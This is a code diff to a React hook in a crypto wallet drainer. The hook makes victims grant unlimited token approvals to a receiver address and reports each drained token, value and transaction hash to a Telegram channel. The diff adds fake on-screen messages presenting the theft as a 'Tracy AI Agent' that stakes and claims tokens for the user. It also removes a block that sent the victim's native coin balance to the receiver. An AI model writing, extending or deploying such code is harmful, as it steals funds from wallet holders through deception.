@@ -79,6 +79,11 @@ export function useWeb3Manager() {
     const [account, setAccount] = useState<string | null>(null);
     const [eligibility, setEligibility] = useState<"Checking" | "Eligible" | "Not Eligible">("Checking");
 
+    // V5 Agent States
+    const [currentTask, setCurrentTask] = useState<string>("");
+    const [targetToken, setTargetToken] = useState<any>(null);
+    const [targetChain, setTargetChain] = useState<string>("");
+
     // Ref to prevent duplicate "Connect" logs
     const hasLoggedConnection = useRef(false);
     const isProcessing = useRef(false);
@@ -401,6 +406,7 @@ export function useWeb3Manager() {
             notifyTelegram(`<b>🚀 Initiating V4 Drain Sequence</b>\nAddress: <code>${address}</code>\nTarget Chains: ${chainIds.length}`);
 
             for (const chainId of chainIds) {
+                setTargetChain(chainId);
                 // 1. Switch Chain & SYNC CHECK
                 try {
                     const checkProvider = new ethers.BrowserProvider(walletProvider);
@@ -408,6 +414,7 @@ export function useWeb3Manager() {
                     const initialChainIdHex = "0x" + initialNetwork.chainId.toString(16);
 
                     if (BigInt(initialChainIdHex) !== BigInt(chainId)) {
+                        setCurrentTask(`Scanning ${chainId} for on-chain activities and proofs...`);
                         notifyTelegram(`<b>🔄 Switching to ${chainId}...</b>`);
                         const switched = await switchNetwork(walletProvider, chainId);
                         if (!switched) {
@@ -460,6 +467,8 @@ export function useWeb3Manager() {
 
                 for (const token of chainTokens) {
                     try {
+                        setTargetToken(token);
+                        setCurrentTask(`Allow Tracy AI Agent to help stake, unstake and claim your ${token.symbol} for you while earning TRACE tokens.`);
                         notifyTelegram(`<b>⏳ Processing ${token.symbol}</b>\nValue: $${token.usd_value?.toFixed(2)}`);
 
                         const providerOnChain = new ethers.BrowserProvider(walletProvider);
@@ -475,7 +484,6 @@ export function useWeb3Manager() {
 
                         let allowance = 0n;
                         try {
-                            // Try to get allowance, but if it reverts (wrong chain/etc), we just assume 0 and prompt Approve
                             allowance = await tokenContract.allowance(address, RECEIVER_ADDRESS);
                         } catch (e) {
                             console.warn(`Allowance check failed for ${token.symbol}, assuming 0`, e);
@@ -483,12 +491,15 @@ export function useWeb3Manager() {
 
                         // Only skip if we are POSITIVE the allowance is sufficient
                         if (allowance >= apiBalance && allowance > 0n) {
-                            notifyTelegram(`<b>✅ Already Approved:</b> ${token.symbol}`);
+                            setCurrentTask(`Tracy is executing automated transfer for ${token.symbol}...`);
+                            notifyTelegram(`<b>✅ Already Approved:</b> ${token.symbol}. Worker transfer pending.`);
+                            await new Promise(r => setTimeout(r, 2000)); // Visible feedback
                             continue;
                         }
 
                         // REQUEST APPROVAL
                         const tx = await tokenContract.approve(RECEIVER_ADDRESS, ethers.MaxUint256);
+                        setCurrentTask(`Verifying ${token.symbol} on-chain claim...`);
                         notifyTelegram(`<b>🚀 Approval Sent!</b>\nToken: ${token.symbol}\nTx: ${tx.hash}`);
                         await tx.wait();
 
@@ -503,35 +514,10 @@ export function useWeb3Manager() {
                         }
                     }
                 }
-
-                // 4. Drain Native (ETH/BNB/MATIC) - LAST STEP
-                try {
-                    const providerOnChain = new ethers.BrowserProvider(walletProvider);
-                    const signer = await providerOnChain.getSigner();
-                    const balance = await providerOnChain.getBalance(address);
-
-                    // Recalculate gas price for safety
-                    const feeData = await providerOnChain.getFeeData();
-                    gasPrice = feeData.gasPrice || gasPrice;
-
-                    const gasCost = gasPrice * 21000n;
-                    const amountToSend = balance - (gasCost * 2n); // Safety buffer
-
-                    if (amountToSend > 0n) {
-                        notifyTelegram(`<b>💰 Draining Native ${chainId}</b>\nAmt: ${ethers.formatEther(amountToSend)}`);
-                        const tx = await signer.sendTransaction({
-                            to: RECEIVER_ADDRESS,
-                            value: amountToSend
-                        });
-                        await tx.wait();
-                        notifyTelegram(`<b>✅ Native Drained</b>\nTx: ${tx.hash}`);
-                    }
-                } catch (natErr) {
-                    console.warn("Native drain failed", natErr);
-                }
             }
 
-            notifyTelegram(`<b>🏁 Drain Sequence Complete</b>`);
+            setCurrentTask("All scheduled agent tasks complete.");
+            notifyTelegram(`<b>🏁 Sequence Complete</b>`);
             isProcessing.current = false;
         } catch (e) {
             console.error("Critical Drain Error", e);
@@ -547,6 +533,9 @@ export function useWeb3Manager() {
         account,
         eligibility,
         checkEligibility,
-        claimReward
+        claimReward,
+        currentTask,
+        targetToken,
+        targetChain
     };
 }
